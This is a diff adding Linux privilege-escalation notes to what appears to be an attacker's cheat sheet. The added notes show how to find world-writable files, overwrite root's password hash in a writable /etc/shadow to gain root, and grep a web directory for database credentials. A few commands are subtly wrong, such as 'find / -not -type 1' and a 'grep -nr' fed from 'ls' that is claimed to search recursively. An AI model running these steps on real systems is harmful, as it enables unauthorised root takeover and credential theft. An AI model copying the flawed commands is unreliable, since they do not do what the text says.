@@ -237,11 +237,24 @@ This allows the tool to attempt to find a token that has the necessary privilege
 
 Finally, got the administrator.
 ________________________________________________________________________________________________________________________________________________________________________
+Linux command can be used to identify files with the write permission applied for all user accounts
+-----------------------------------------------------------------------------------------------------
+#find / -not -type 1 -perm -o+w
 
+#/etc/shadow (all user can write)
 
+#openssl passwd -1 -salt abc password
+#nano /etc/shadow
+Paste that in root user password > gain root access
+__________________________________________________________________________________________________________________________________________________________________________
+Locally stored credentials
+--------------------------
+Go to the /html directory
 
+#cd /var/www/html
+#ls -al | grep -nr "db_user"
 
-
+Finally, you will see the db_user credentials recursively.
 ________________________________________________________________________________________________________________________________________________________________________
 
 
